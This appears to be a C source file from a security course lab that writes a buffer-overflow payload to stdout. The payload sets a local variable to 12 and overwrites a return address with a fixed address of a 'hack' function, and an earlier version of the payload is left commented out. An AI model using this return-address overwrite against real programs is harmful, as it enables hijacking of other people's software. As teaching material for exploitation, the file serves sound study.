#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

/**
 * The exploit string that will be written to stdout
 * 
 * \x is the escape character that makes gcc interpret the coming 
 * characters as hexadecimal values (not as ASCII characters). The sequence of 
 * bytes in "exploit" will exactly match the bytes you denote in hex (and thus binary).
 * 
 * 1 byte is represented with 2 hex numbers
 * 1 byte --> 8 bits --> [0 - 255] : [0000 0000 - 1111 1111] : [00 - FF]
 * 
 * https://www.w3resource.com/convert/number/hex-to-binary.php
 * 
 * So if we wanted to write 2 bytes of all 1s we would write 
 * 
 * "\xFF\xFF" --> 1111 1111 1111 1111
 * 
 */

// const char exploit[] = "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x83\x00\x00\x0a";  // set the 45th byte to 0x83 and add a newline

/** 
 * Write the exploit bytes to stdout
 */

// int main(int argc, char** argv)
// {

//     // strings are null terminated so we write the sizeof the exploit string minus 1 
//     // to only write out the bytes specified 
//     write(STDOUT_FILENO,exploit,sizeof(exploit) -1);

//     // free(e);
//     return 0; 

    
// }

// Define the address of the hack function
#define HACK_ADDR 0x401156

int main() {
    // Buffer of 56 bytes for buffer (32 bytes for buf and 24 bytes for padding)
    // + 8 bytes for the overwritten return address + 1 for the null terminator
    char buffer[56 + 8 + 1];
    int i;

    // Fill buffer with null bytes (0x00) to avoid modifying unintended memory
    for (i = 0; i < 56; i++) {
        buffer[i] = '\x00';
    }
    
    // Manually set the value at offset 44 to 0x0C (12 in decimal)
    // This is to ensure that fav_number is overwritten with 12
    buffer[44] = '\x0C';


    // Overwrite the return address with the address of the hack function
    long *ret = (long *)(buffer + 56);
    *ret = HACK_ADDR;

    // Null terminator
    buffer[56 + 8] = '\0';

    // Write exploit to stdout
    write(STDOUT_FILENO, buffer, sizeof(buffer) - 1);

    return 0;
}
